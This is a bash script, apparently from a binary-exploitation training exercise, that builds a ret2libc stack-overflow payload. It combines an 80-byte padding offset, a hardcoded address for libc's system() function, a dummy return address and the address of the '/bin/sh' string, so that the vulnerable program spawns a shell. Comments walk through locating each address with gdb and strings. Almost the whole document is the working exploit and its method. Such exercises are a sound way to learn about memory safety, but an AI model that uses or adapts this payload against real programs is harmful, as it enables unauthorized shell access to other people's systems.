#!/bin/bash
encode() {
    printf "$1" | xxd -r -p
}

offset="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"

# Apply the ret2libc method
# Find the location of the `system` function by executing
# `p system` in gdb. (found 0xb7ecffb0)
jmp=`encode b0ffecb7`

# Since we are exploiting `ret`, but need the stack to look like
# the `system` method was executed using the `call` instruction,
# we need to adjust the stack accordingly. The `call` instruction
# first expects a return address on the stack, then the arguments.
# It doesn't really matter what the return address is at this point.
return_addr="AAAA"

# The pointer to a "/bin/sh" string in libc
# We could add this path to the stack, but the address of the string would
# not always be the same, because the stack might contain different data.
# 
# Use `info proc map` to get the location of the libc library in memory,
# (found 0xb7e97000)
# Then search for the relative location of the "/bin/sh" string in the
# file defined by the path on the right side.
# Use `strings -a -t x <the-path> | grep "/bin/sh"` to figure out the offset.
# Add the two numbers and you've got the result.
# (found 0x11f3bf)
# You can use `x/s 0x<libc addr>+0x<binsh addr>` to check from within gdb.
# 0xb7e97000 + 0x11f3bf = 0xb7fb63bf
shellpath=`encode bf63fbb7`

# Use `printf` instead of `echo` so the newline character is not included
printf "$offset$jmp$return_addr$shellpath"
